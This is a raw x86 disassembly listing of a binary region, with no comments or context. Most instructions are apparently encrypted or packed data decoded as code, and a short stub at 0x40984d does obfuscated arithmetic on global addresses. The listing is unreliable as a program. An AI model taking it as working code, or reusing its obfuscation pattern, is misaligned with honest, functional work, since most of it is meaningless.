  40953b:	dec    esi
  40953c:	fsub   st,st(5)
  40953e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40953f:	or     BYTE PTR [ecx],0x12
  409542:	jg     0x4095a7
  409544:	mov    esi,0x4eb834fd
  409549:	cdq    
  40954a:	xchg   esi,eax
  40954b:	cwde   
  40954c:	sar    BYTE PTR [edx+eiz*1+0x23],0x7a
  409551:	xor    ch,ch
  409553:	xchg   ecx,eax
  409554:	js     0x40958b
  409556:	and    al,0xcb
  409558:	imul   esi,ecx,0x71
  40955b:	fstp   DWORD PTR [ecx]
  40955d:	mov    ch,BYTE PTR [eax]
  40955f:	scas   eax,DWORD PTR es:[edi]
  409560:	int3   
  409561:	lods   al,BYTE PTR ds:[esi]
  409562:	cld    
  409563:	xchg   esi,eax
  409564:	xchg   edx,eax
  409565:	push   ebx
  409566:	and    dl,bh
  409568:	adc    bl,BYTE PTR [edi-0x4c]
  40956b:	repz ret 0x561e
  40956f:	or     ch,ah
  409571:	mov    eax,0x7373604a
  409576:	mov    ah,0xc5
  409578:	mov    eax,ds:0x7b4d768b
  40957d:	inc    esi
  40957e:	(bad)  
  40957f:	repnz pop esp
  409581:	pop    ebx
  409582:	or     DWORD PTR [edi+0x56],ebx
  409585:	fcmovu st,st(5)
  409587:	ret    
  409588:	inc    ebx
  409589:	fild   QWORD PTR [ebp-0x49]
  40958c:	in     al,0x5e
  40958e:	aaa    
  40958f:	stc    
  409590:	sub    bl,BYTE PTR [esi+eax*1+0x5b]
  409594:	scas   eax,DWORD PTR es:[edi]
  409595:	push   0x8bd55d7c
  40959a:	inc    edi
  40959b:	arpl   WORD PTR [ebx+0x4c],di
  40959e:	dec    edx
  40959f:	mov    ch,0x25
  4095a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095a2:	popf   
  4095a3:	adc    DWORD PTR [eax+0x6ddad775],esp
  4095a9:	mov    ecx,DWORD PTR [ebx]
  4095ab:	popf   
  4095ac:	cs add cl,cl
  4095af:	loop   0x409586
  4095b1:	push   ss
  4095b2:	jne    0x40958e
  4095b4:	sbb    BYTE PTR [edi],cl
  4095b6:	sbb    BYTE PTR [esi],0x66
  4095b9:	aam    0x79
  4095bb:	fcmovnbe st,st(4)
  4095bd:	adc    DWORD PTR [ebx],edx
  4095bf:	add    eax,0xf87eb180
  4095c4:	stos   DWORD PTR es:[edi],eax
  4095c5:	test   DWORD PTR [esi],0x280f9457
  4095cb:	mov    esi,0x95f1f696
  4095d0:	es dec esi
  4095d2:	xchg   edx,eax
  4095d3:	cmp    al,0x4a
  4095d5:	fcomp  DWORD PTR [eax-0x67]
  4095d8:	mov    ebp,DWORD PTR [ebx+0x3d]
  4095db:	mov    al,0x6b
  4095dd:	mov    eax,0x7f2ad927
  4095e2:	lea    esp,[edx]
  4095e4:	jbe    0x409631
  4095e6:	test   ecx,eax
  4095e8:	in     al,0xff
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e4c:0x787d094e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	dec    edi
  40960d:	mul    BYTE PTR [ebp-0x27]
  409610:	jb     0x409612
  409612:	cmp    al,0xe1
  409614:	popa   
  409615:	std    
  409616:	and    esp,DWORD PTR [ebp-0x1e]
  409619:	inc    ebp
  40961a:	stc    
  40961b:	or     cl,BYTE PTR [eax]
  40961d:	(bad)  
  40961e:	enter  0xd4c0,0x28
  409622:	xlat   BYTE PTR ds:[ebx]
  409623:	or     ebp,ebp
  409625:	dec    ebx
  409626:	add    ecx,DWORD PTR [esi]
  409628:	popa   
  409629:	shl    ah,cl
  40962b:	pop    es
  40962c:	and    al,0x7b
  40962e:	aam    0xe0
  409630:	dec    ebx
  409631:	pop    edx
  409632:	stos   DWORD PTR es:[edi],eax
  409633:	or     BYTE PTR [esi*1-0x5248ec39],cl
  40963a:	mov    esi,0x3a3d5f69
  40963f:	ins    DWORD PTR es:[edi],dx
  409640:	mov    edx,0x9ca62f3e
  409645:	sbb    bh,BYTE PTR [esi-0x70]
  409648:	xchg   esp,eax
  409649:	or     bl,ch
  40964b:	fdiv   DWORD PTR es:[ebp+0x598c26fc]
  409652:	jnp    0x409642
  409654:	in     eax,dx
  409655:	add    esp,DWORD PTR [eax]
  409657:	and    eax,0x941e67fe
  40965c:	xor    DWORD PTR [ecx-0x41],esi
  40965f:	jp     0x40966f
  409661:	push   ebx
  409662:	icebp  
  409663:	push   es
  409664:	inc    ebx
  409665:	es enter 0xcb15,0x74
  40966a:	jmp    DWORD PTR [ebx+0x4a]
  40966d:	bound  edx,QWORD PTR [eax]
  40966f:	pushf  
  409670:	fst    DWORD PTR [esi-0x7d]
  409673:	je     0x4096a6
  409675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409676:	mov    dh,0x25
  409678:	bound  eax,QWORD PTR [edi]
  40967a:	push   es
  40967b:	add    DWORD PTR [esi-0x50afb3d3],ecx
  409681:	(bad)  
  409682:	je     0x4096e0
  409684:	pop    ebp
  409685:	(bad)  
  409686:	not    DWORD PTR [ebp+0x108865b]
  40968c:	mov    ds:0xf9447d6a,al
  409691:	cwde   
  409692:	pop    ds
  409693:	pop    ebx
  409694:	stos   DWORD PTR es:[edi],eax
  409695:	pusha  
  409696:	ins    BYTE PTR es:[edi],dx
  409697:	repz pop ecx
  409699:	pop    ss
  40969a:	sbb    edx,edi
  40969c:	dec    ecx
  40969d:	add    DWORD PTR [edi],edi
  40969f:	fs pusha 
  4096a1:	test   DWORD PTR [ecx+0x37534ec1],esi
  4096a7:	add    edx,DWORD PTR [edx+0xd34f8f3]
  4096ad:	mov    edi,0xa9b914c
  4096b2:	adc    DWORD PTR [edi-0x69],edx
  4096b5:	cld    
  4096b6:	(bad)  
  4096b7:	arpl   WORD PTR [esi+0x27],sp
  4096ba:	in     al,0x8b
  4096bc:	push   cs
  4096bd:	dec    esi
  4096be:	jl     0x409680
  4096c0:	sbb    esi,ecx
  4096c2:	ss sbb eax,0xbe59c1cf
  4096c8:	addr16 int3 
  4096ca:	add    eax,DWORD PTR [eax]
  4096cc:	(bad)  
  4096cd:	sub    edi,DWORD PTR [edx+0x2e]
  4096d0:	aam    0xf5
  4096d2:	lock mov ch,0xeb
  4096d5:	sub    ah,BYTE PTR [edi+0x62bb382e]
  4096db:	inc    ebp
  4096dc:	add    ch,BYTE PTR [ecx-0x55ca8046]
  4096e2:	test   al,0xed
  4096e4:	mov    esp,0x642fe685
  4096e9:	cmp    dh,BYTE PTR [esi-0x47d33715]
  4096ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096f0:	pushf  
  4096f1:	dec    eax
  4096f2:	adc    BYTE PTR [edi-0x2ceb4b8],dh
  4096f8:	dec    ecx
  4096f9:	cmp    DWORD PTR [di+0x6b],0xffffffde
  4096fe:	or     eax,eax
  409700:	and    eax,0x2fdc3870
  409705:	mov    ecx,0x4fadbbb1
  40970a:	sub    BYTE PTR [edx+0x6a],ch
  40970d:	cwde   
  40970e:	adc    al,0xe6
  409710:	stos   BYTE PTR es:[edi],al
  409711:	sar    DWORD PTR [ebx+edi*1-0x1a25ebfd],0x92
  409719:	dec    edi
  40971a:	dec    ebp
  40971b:	xor    bl,BYTE PTR [ebx+0x6064af17]
  409721:	sbb    BYTE PTR ds:0x68c51a5b,0xe5
  409728:	adc    DWORD PTR [ecx],edx
  40972a:	popa   
  40972b:	test   eax,0x3b8d1255
  409730:	mov    ebx,0x843762a4
  409735:	pop    esp
  409736:	(bad)  
  409737:	cmp    eax,0x24ad927d
  40973c:	iret   
  40973d:	das    
  40973e:	(bad)  
  40973f:	fistp  QWORD PTR [ebx+0x63]
  409742:	pop    ecx
  409743:	add    ebp,DWORD PTR [ebx-0x5eb15f66]
  409749:	(bad)  
  40974a:	std    
  40974b:	sbb    ebx,DWORD PTR [ecx]
  40974d:	cli    
  40974e:	cli    
  40974f:	push   ss
  409750:	adc    al,0x4a
  409752:	dec    ebx
  409753:	retf   
  409754:	sbb    ebx,DWORD PTR [ecx+0x5a272439]
  40975a:	push   ecx
  40975b:	mov    esp,0x761cf51e
  409760:	data16 fstp TBYTE PTR [ebp-0x70972e09]
  409767:	into   
  409768:	dec    esi
  409769:	lods   eax,DWORD PTR ds:[esi]
  40976a:	aas    
  40976b:	mov    bh,0x2c
  40976d:	xlat   BYTE PTR ds:[ebx]
  40976e:	mov    al,ds:0x41e90e04
  409773:	mov    eax,ds:0xe5394a9e
  409778:	mov    cs:0xd21dc0d5,eax
  40977e:	push   edi
  40977f:	into   
  409780:	and    eax,0x151ee720
  409785:	jecxz  0x4097e7
  409787:	mov    ah,0x76
  409789:	std    
  40978a:	arpl   bx,cx
  40978c:	xor    DWORD PTR [ecx],ecx
  40978e:	shr    BYTE PTR [ebx-0x8],1
  409791:	rol    DWORD PTR ds:0x119d247e,0x8
  409798:	mov    ch,bl
  40979a:	ret    0x9976
  40979d:	dec    edi
  40979e:	std    
  40979f:	or     eax,0x20d4ca9d
  4097a4:	lods   eax,DWORD PTR ds:[esi]
  4097a5:	fmul   st,st(7)
  4097a7:	xchg   BYTE PTR [edx+eiz*1],ah
  4097aa:	sbb    eax,ecx
  4097ac:	pop    esi
  4097ad:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4097af:	fs jp  0x4097dd
  4097b2:	cld    
  4097b3:	dec    ebx
  4097b4:	adc    edi,DWORD PTR ds:0xcb4e08cd
  4097ba:	int    0x63
  4097bc:	xlat   BYTE PTR ds:[ebx]
  4097bd:	pusha  
  4097be:	fcom   DWORD PTR [edx-0x447571a6]
  4097c4:	sub    DWORD PTR [ecx-0x6e1421c8],0x54
  4097cb:	inc    edi
  4097cc:	cli    
  4097cd:	ins    BYTE PTR es:[edi],dx
  4097ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097cf:	sbb    DWORD PTR [edx+eiz*2],esi
  4097d2:	push   edi
  4097d3:	mov    ds:0x3733a972,al
  4097d8:	xchg   ecx,eax
  4097d9:	bound  esp,QWORD PTR [eax+0x6a]
  4097dc:	dec    ecx
  4097dd:	scas   eax,DWORD PTR es:[edi]
  4097de:	mov    dl,0x7a
  4097e0:	fist   WORD PTR [ebx+0x603a6864]
  4097e6:	mov    bl,ah
  4097e8:	out    dx,eax
  4097e9:	mov    al,ds:0x79b6015c
  4097ee:	xchg   esp,eax
  4097ef:	cmp    esi,DWORD PTR [ecx-0x447903e3]
  4097f5:	pop    esp
  4097f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097f7:	std    
  4097f8:	xlat   BYTE PTR ds:[ebx]
  4097f9:	add    DWORD PTR ds:0x296b4370,0xffffff8b
  409800:	sbb    BYTE PTR [edx+0x44177e21],dh
  409806:	jbe    0x4097ad
  409808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409809:	test   BYTE PTR [ebp+0x4],ch
  40980c:	cmc    
  40980d:	js     0x409886
  40980f:	test   dh,ah
  409811:	mov    esp,0x78cfd264
  409816:	push   0xffffffda
  409818:	push   ebx
  409819:	pop    edx
  40981a:	es jo  0x409873
  40981d:	in     al,0x80
  40981f:	adc    edx,ecx
  409821:	bound  esp,QWORD PTR [esi+ebx*1]
  409824:	cmp    ah,ch
  409826:	push   ds
  409827:	mov    eax,ds:0x23a3df59
  40982c:	sbb    dh,ch
  40982e:	dec    ebx
  40982f:	or     al,0x9b
  409831:	pop    esi
  409832:	mov    ch,0x46
  409834:	adc    DWORD PTR [ecx+0x3bf4458b],0xee840fc3
  40983e:	lock (bad) 
  409840:	dec    DWORD PTR [ebx+0x8bf845]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43375f
  40986f:	xor    DWORD PTR ds:0x433697,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43375b,0x43372b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4336e7,0x433793
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43367b
  4098a6:	sub    DWORD PTR ds:0x43375f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	inc    edi
  4098c1:	and    esi,DWORD PTR [ebp+ecx*1-0x4c]
  4098c5:	fnstcw WORD PTR [esi+0x7e]
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	cmp    al,0x10
  4098ce:	push   ss
  4098cf:	and    edi,DWORD PTR [esi-0x64]
  4098d2:	call   0x72fa:0x2b2ca30c
  4098d9:	in     al,dx
  4098da:	inc    ecx
  4098db:	or     al,0xd6
  4098dd:	mov    ds:0xd8448650,eax
  4098e2:	int3   
  4098e3:	push   es
  4098e4:	pusha  
  4098e5:	pop    esi
  4098e6:	add    eax,0xb12149dc
  4098eb:	int    0x1c
  4098ed:	jg     0x40991f
  4098ef:	(bad)  
  4098f1:	and    eax,0xa19121dd
  4098f6:	sub    ebx,DWORD PTR [edi]
  4098f8:	hlt    
  4098f9:	jmp    0x2993:0x488b7730
  409900:	js     0x409900
  409902:	jne    0x4098c3
  409904:	pop    es
  409905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409906:	jns    0x4098fc
  409908:	lds    edx,FWORD PTR [edi-0x5a]
  40990b:	popa   
  40990c:	xor    esp,DWORD PTR [ebx+0x49bca3e1]
  409912:	add    eax,0x20f61f97
  409917:	push   cs
  409918:	xchg   ebx,ebp
  40991a:	es jmp 0x32733859
  409920:	pusha  
  409921:	lock stos BYTE PTR es:[edi],al
  409923:	cmp    eax,0x5b1019fb
  409928:	mov    ch,BYTE PTR [ecx+eax*4-0x72]
  40992c:	pop    esp
  40992d:	mov    al,BYTE PTR [ebx]
  40992f:	test   BYTE PTR [ebp-0x42778de4],bh
  409935:	xchg   ax,ax
  409937:	arpl   WORD PTR [ebx],dx
  409939:	int3   
  40993a:	push   esi
  40993b:	enter  0x5b60,0x50
  40993f:	sub    edi,edx
  409941:	out    dx,eax
  409942:	push   ss
  409943:	mov    al,0xaf
  409945:	xor    dh,BYTE PTR [edx]
  409947:	bnd jno 0x40997f
  40994a:	fnstcw WORD PTR [edi]
  40994c:	enter  0xb6f9,0x89
  409950:	sub    al,0xd8
  409952:	add    edi,DWORD PTR [eax-0x1f]
  409955:	(bad)  
  409956:	rcl    BYTE PTR [edx],0x2e
  409959:	add    edi,DWORD PTR [ecx-0x2]
  40995c:	jge    0x4099be
  40995e:	fwait
  40995f:	adc    BYTE PTR [esp+ecx*2+0x63],ah
  409963:	cs (bad) 
  409965:	gs icebp 
  409967:	outs   dx,DWORD PTR ds:[esi]
  409968:	loope  0x409932
  40996a:	hlt    
  40996b:	cmp    esi,ebp
  40996d:	jecxz  0x409964
  40996f:	cwde   
  409970:	int    0xe7
  409972:	call   0x163f:0xc7c3e4b0
  409979:	(bad)
  40997d:	test   DWORD PTR [ecx-0x1a],ebp
  409980:	mov    esi,0xbd507c5c
  409985:	lock and DWORD PTR [ecx-0x3271bd26],ecx
  40998c:	jecxz  0x409953
  40998e:	add    al,0xb2
  409990:	jo     0x4099e8
  409992:	ins    DWORD PTR es:[edi],dx
  409993:	leave  
  409994:	ins    BYTE PTR es:[edi],dx
  409995:	std    
  409996:	jns    0x409970
  409998:	sbb    al,BYTE PTR [ebx-0x7]
  40999b:	outs   dx,DWORD PTR ds:[esi]
  40999c:	gs call 0x7100938e
  4099a2:	adc    esp,esp
  4099a4:	loopne 0x40999a
  4099a6:	loop   0x409996
  4099a8:	call   0x61cc:0xacceade5
  4099af:	paddd  mm6,QWORD PTR gs:0xa36859df
  4099b7:	mov    bl,0x90
  4099b9:	sub    eax,0xd4f54e73
  4099be:	sub    bl,BYTE PTR [ebx+ecx*2]
  4099c1:	ss jge 0x4099cf
  4099c4:	enter  0xad54,0x54
  4099c8:	xor    DWORD PTR [edx],ecx
  4099ca:	ds push ebp
  4099cc:	inc    ebx
  4099cd:	cmp    DWORD PTR [ebx+0x12],0x49b44151
  4099d4:	jmp    0x4099e3
  4099d6:	out    dx,al
  4099d7:	es or  ebp,DWORD PTR ss:[ebx]
  4099db:	sbb    eax,0x90e59e64
  4099e0:	xchg   edi,eax
  4099e1:	shl    BYTE PTR [edi-0x3046f2d9],0x5
  4099e8:	lahf   
  4099e9:	inc    ebp
  4099ea:	out    dx,al
  4099eb:	cmp    ah,BYTE PTR [ebx-0xe9d01a0]
  4099f1:	jns    0x4099be
  4099f3:	ret    0x87aa
  4099f6:	scas   al,BYTE PTR es:[edi]
  4099f7:	not    DWORD PTR [ebx+0x17800829]
  4099fd:	and    al,0xac
  4099ff:	(bad)  
  409a00:	js     0x409a2f
  409a02:	cmc    
  409a03:	pop    es
  409a04:	test   BYTE PTR ds:0xc9e23564,ah
  409a0a:	xor    BYTE PTR [ebx],dh
  409a0c:	(bad)  
  409a0d:	and    DWORD PTR [ebp-0xd],edx
  409a10:	adc    DWORD PTR [edx+ebp*1-0x3d],esp
  409a14:	xor    DWORD PTR [esi-0x7291e15],edi
  409a1a:	mov    ebp,0x18d4d11a
  409a1f:	adc    eax,0x8460d6b4
  409a24:	test   DWORD PTR [eax],eax
  409a26:	mov    edi,0x6135a4e4
  409a2b:	aam    0x38
  409a2d:	sbb    ebp,DWORD PTR [eax+eiz*2+0x63]
  409a31:	and    ah,BYTE PTR [esi]
  409a33:	jo     0x409ab0
  409a35:	retf   0x3ce2
  409a38:	and    edi,DWORD PTR [eax+0x4f]
  409a3b:	jmp    0x909b:0x5772ae1b
  409a42:	or     edi,eax
  409a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a45:	or     eax,ebx
  409a47:	mov    ebp,DWORD PTR [edx+0x56]
  409a4a:	mov    ds:0x275f4a31,eax
  409a4f:	add    cl,BYTE PTR [edi-0x46]
  409a52:	(bad)  
  409a53:	lock loopne 0x409aa9
  409a56:	sub    ah,BYTE PTR [ebx+0x7d814d6a]
  409a5c:	pop    edx
  409a5d:	outs   dx,DWORD PTR ds:[esi]
  409a5e:	lea    ebx,[ecx]
  409a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a61:	inc    edx
  409a62:	push   ds
  409a63:	jmp    0x4409:0xefe6cae1
  409a6a:	cld    
  409a6b:	outs   dx,DWORD PTR ds:[esi]
  409a6c:	cmp    ebp,DWORD PTR [edi]
  409a6e:	mov    esi,0xa537da11
  409a73:	lods   eax,DWORD PTR ds:[esi]
  409a74:	jae    0x409abc
  409a76:	adc    eax,0xcea326f0
  409a7b:	dec    ecx
  409a7c:	jecxz  0x409aed
  409a7e:	dec    ebx
  409a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a80:	push   ebp
  409a81:	les    ebx,FWORD PTR [ebx+0x12]
  409a84:	xchg   esp,eax
  409a85:	sbb    cl,bl
  409a87:	rcl    BYTE PTR [eax],1
  409a89:	pop    edi
  409a8a:	out    0x32,al
  409a8c:	iret   
  409a8d:	stos   DWORD PTR es:[edi],eax
  409a8e:	pop    esp
  409a8f:	scas   eax,DWORD PTR es:[edi]
  409a90:	push   esp
  409a91:	or     bh,BYTE PTR [edi]
  409a93:	xor    ecx,edi
  409a95:	stos   BYTE PTR es:[edi],al
  409a96:	adc    al,0x73
  409a98:	int    0x6a
  409a9a:	xor    al,0xcc
  409a9c:	jp     0x409a2b
  409a9e:	pop    ecx
  409a9f:	pop    ss
  409aa0:	imul   bh
  409aa2:	sti    
  409aa3:	inc    edi
  409aa4:	(bad)  
  409aa5:	mov    eax,0x4ec7dbea
  409aaa:	mov    al,0x2d
  409aac:	dec    ebx
  409aad:	in     eax,dx
  409aae:	scas   eax,DWORD PTR es:[edi]
  409aaf:	mov    ebp,0x2d21bd8c
  409ab4:	push   0xffffff92
  409ab6:	dec    edx
  409ab7:	test   DWORD PTR [ebp+0x4dc3610d],ecx
  409abd:	icebp  
  409abe:	adc    esp,DWORD PTR [edx]
  409ac0:	enter  0x89d0,0x2f
  409ac4:	addr16 sti 
  409ac6:	adc    ah,BYTE PTR [ecx-0x4b]
  409ac9:	lgdtd  ds:0x5a7ced9
  409ad0:	fnstcw WORD PTR [esi-0x548b0291]
  409ad6:	mov    ebx,0x63c5f9a
  409adb:	test   esi,0xbcaf2efd
  409ae1:	retf   
  409ae2:	ins    DWORD PTR es:[edi],dx
  409ae3:	cmp    al,0xa1
  409ae5:	cmp    al,0xf3
  409ae7:	cmp    bl,0x77
  409aea:	arpl   WORD PTR [esi+0xcb85730],si
  409af0:	jbe    0x409a99
  409af2:	arpl   WORD PTR [esi+0x4a],cx
  409af5:	xchg   edx,eax
  409af6:	jge    0x409afb
  409af8:	xlat   BYTE PTR ds:[ebx]
  409af9:	add    dl,bl
  409afb:	mov    ecx,0xe0001e13
  409b00:	fimul  DWORD PTR [eax-0x18]
  409b03:	cmp    eax,0x36167e5b
  409b08:	ret    0x51b4
  409b0b:	daa    
  409b0c:	mov    fs,WORD PTR [ecx+ebp*2+0x76]
  409b10:	mov    WORD PTR [ebx+0x56],ds
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43371f,0x4336d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x442339d4]
  409b32:	jg     0x409bb2
  409b34:	in     al,0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409b20
  409b3c:	mov    eax,ds:0x702a9304
  409b41:	mov    bh,0xea
  409b43:	sub    BYTE PTR [esi],bh
  409b45:	mov    BYTE PTR ds:0x5665ca32,ch
  409b4b:	(bad)  
  409b4c:	xlat   BYTE PTR ds:[ebx]
  409b4d:	cmp    bl,BYTE PTR [ebx-0x29]
  409b50:	sub    bh,BYTE PTR [ebx-0x34]
  409b53:	fsubr  QWORD PTR [ecx-0x76]
  409b56:	shl    DWORD PTR [ebp+0x3d3455bf],0x55
  409b5d:	sbb    al,0x36
  409b5f:	pop    edx
  409b60:	fwait
  409b61:	into   
  409b62:	pop    ecx
  409b63:	sbb    DWORD PTR [edi-0x1c183772],edx
  409b69:	retf   0x37bb
  409b6c:	loope  0x409b1a
  409b6e:	not    DWORD PTR [ebp+0x66]
  409b71:	scas   al,BYTE PTR es:[edi]
  409b72:	out    dx,al
  409b73:	mov    eax,ds:0x16aeca8d
  409b78:	jnp    0x409b5b
  409b7a:	fldcw  WORD PTR [esi]
  409b7c:	mov    esp,0xbbfd5c3c
  409b81:	jmp    0x409bf6
  409b83:	(bad)  
  409b84:	retf   0x6d19
  409b87:	sub    DWORD PTR [esi-0x1e],edi
  409b8a:	shr    bh,0x78
  409b8d:	(bad)  
  409b8f:	outs   dx,BYTE PTR ds:[esi]
  409b90:	cwde   
  409b91:	shl    DWORD PTR [edx+0x7f75a7c0],1
  409b97:	dec    esi
  409b98:	repz sahf 
  409b9a:	retf   
  409b9b:	outs   dx,DWORD PTR ds:[esi]
  409b9c:	mov    ds:0xdcb22fe1,eax
  409ba1:	nop
  409ba2:	cdq    
  409ba3:	popa   
  409ba4:	dec    edi
  409ba5:	jne    0x409b79
  409ba7:	push   ebx
  409ba8:	sub    edx,DWORD PTR [ebp-0x64]
  409bab:	mov    BYTE PTR [eax],dh
  409bad:	shl    ah,cl
  409baf:	sbb    BYTE PTR [eax-0x3b],bh
  409bb2:	sbb    eax,edi
  409bb4:	pop    ds
  409bb5:	or     eax,0x40e6382b
  409bba:	mov    ah,0x3c
  409bbc:	call   0x8d73653d
  409bc1:	in     al,0xc9
  409bc3:	add    ebp,DWORD PTR [ebx]
  409bc5:	fwait
  409bc6:	push   ecx
  409bc7:	mov    ah,0x79
  409bc9:	jmp    0x409bdd
  409bcb:	shl    dl,cl
  409bcd:	repz sbb ecx,esi
  409bd0:	mov    dh,0xc0
  409bd2:	dec    ebx
  409bd3:	mov    DWORD PTR [eax],edx
  409bd5:	jbe    0x409bdc
  409bd7:	call   0x6e76:0xd5f39d7b
  409bde:	std    
  409bdf:	sub    al,0x34
  409be1:	cmp    DWORD PTR [edi],ebp
  409be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409be4:	xor    eax,0x71f9a4ac
  409be9:	jmp    DWORD PTR [ebx-0x75f54da7]
  409bef:	pushf  
  409bf0:	(bad)  
  409bf1:	loopne 0x409c64
  409bf3:	inc    ecx
  409bf4:	outs   dx,DWORD PTR ds:[esi]
  409bf5:	and    BYTE PTR [ebp-0x21bf0902],bh
  409bfb:	cmp    cl,BYTE PTR [ebx+0x7e]
  409bfe:	sbb    eax,0x9a3ab590
  409c03:	jne    0x409c3e
  409c05:	xchg   esp,eax
  409c06:	sub    al,0x19
  409c08:	in     al,0x2a
  409c0a:	pop    esi
  409c0b:	ret    0xbad4
  409c0e:	ins    BYTE PTR es:[edi],dx
  409c0f:	or     bl,BYTE PTR [esi-0x47]
  409c12:	retf   
  409c13:	dec    edi
  409c14:	xor    BYTE PTR [ebx+0x5a315be9],dl
  409c1a:	imul   eax,esi,0x233326d5
  409c20:	mov    cl,BYTE PTR ds:0xa410d9f3
  409c26:	sub    edi,ebx
  409c28:	leave  
  409c29:	mov    dl,0x8a
  409c2b:	shr    BYTE PTR [edi],1
  409c2d:	das    
  409c2e:	push   ecx
  409c2f:	shr    ecx,cl
  409c31:	idiv   BYTE PTR [ebx]
  409c33:	(bad)  
  409c34:	xor    bh,BYTE PTR [ebp+0x4ff6496e]
  409c3a:	mov    edi,0x520e7f9d
  409c3f:	xchg   edx,eax
  409c40:	dec    ebp
  409c41:	clc    
  409c42:	adc    DWORD PTR [eax+0x45],ecx
  409c45:	adc    DWORD PTR [eax+0x4f],0x6d3f4dbc
  409c4c:	retf   
  409c4d:	addr16 push ecx
  409c4f:	sahf   
  409c50:	mov    WORD PTR [edx+0x52],?
  409c53:	jnp    0x409ca1
  409c55:	lods   al,BYTE PTR ds:[esi]
  409c56:	stos   DWORD PTR es:[edi],eax
  409c57:	xchg   edi,eax
  409c58:	ret    0x2c34
  409c5b:	(bad)  
  409c5c:	ins    BYTE PTR es:[edi],dx
  409c5d:	mov    edi,0xb20aded9
  409c62:	pop    esi
  409c63:	mov    ds:0x9a9d922f,al
  409c68:	adc    al,0xc5
  409c6a:	adc    eax,0xedbdaeb9
  409c6f:	jns    0x409cdb
  409c71:	fwait
  409c72:	ins    BYTE PTR es:[edi],dx
  409c73:	xchg   esi,eax
  409c74:	mov    bl,0xef
  409c76:	fist   DWORD PTR [edi]
  409c78:	xlat   BYTE PTR ds:[ebx]
  409c79:	jne    0x409c56
  409c7b:	cmp    al,BYTE PTR [esi+eiz*4]
  409c7e:	mov    dh,0xd
  409c80:	ja     0x409c76
  409c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c83:	jl     0x409c91
  409c85:	jne    0x409c1a
  409c87:	jp     0x409c63
  409c89:	ss mov dl,0x55
  409c8c:	mov    ds:0xde0cacb,eax
  409c91:	sbb    esi,esp
  409c93:	xor    DWORD PTR [ebx],esi
  409c95:	mov    edi,0x27392704
  409c9a:	cmc    
  409c9b:	inc    edx
  409c9c:	sub    ch,BYTE PTR [ecx]
  409c9e:	rcr    BYTE PTR [ecx+0x7fd95c31],1
  409ca4:	mov    DWORD PTR [esi+0xaaa5ebd],edx
  409caa:	enter  0xb87,0xe6
  409cae:	jl     0x409cbf
  409cb0:	fnstenv [edi+0x762afa3b]
  409cb6:	pop    es
  409cb7:	pusha  
  409cb8:	pop    ss
  409cb9:	dec    eax
  409cba:	ffree  st(1)
  409cbc:	mov    edi,0xefd4eebf
  409cc1:	mov    ds:0x63f45b1f,eax
  409cc6:	pop    ebp
  409cc7:	add    BYTE PTR [ecx-0x14],0x5f
  409ccb:	stc    
  409ccc:	leave  
  409ccd:	mov    esi,0x4fd6cc18
  409cd2:	push   edx
  409cd3:	das    
  409cd4:	ss ret 
  409cd6:	call   DWORD PTR [edi+0x43e0cc02]
  409cdc:	jmp    0x8e4a:0x59622e8c
  409ce3:	inc    edi
  409ce4:	jbe    0x409c9f
  409ce6:	lods   al,BYTE PTR ds:[esi]
  409ce7:	cmp    eax,0xf7738e13
  409cec:	clc    
  409ced:	pusha  
  409cee:	and    al,0x20
  409cf0:	mov    ds:0xd492e09e,al
  409cf5:	int    0xdf
  409cf7:	stos   DWORD PTR es:[edi],eax
  409cf8:	jle    0x409cc8
  409cfa:	scas   al,BYTE PTR es:[edi]
  409cfb:	fst    QWORD PTR [edx+0x4254f95b]
  409d01:	cmp    BYTE PTR [esi],cl
  409d03:	je     0x409d1d
  409d05:	xor    DWORD PTR [eax+0x2d],edi
  409d08:	dec    ebp
  409d09:	jne    0x409d1f
